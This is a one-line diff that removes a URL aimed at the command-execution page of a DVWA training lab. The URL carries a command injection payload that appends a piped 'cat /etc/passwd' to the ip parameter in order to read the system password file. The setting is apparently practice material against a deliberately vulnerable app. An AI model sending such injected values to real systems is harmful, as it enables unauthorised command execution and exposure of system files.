@@ -1,1 +1,0 @@
-http://dvwa.kt66.lab/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd
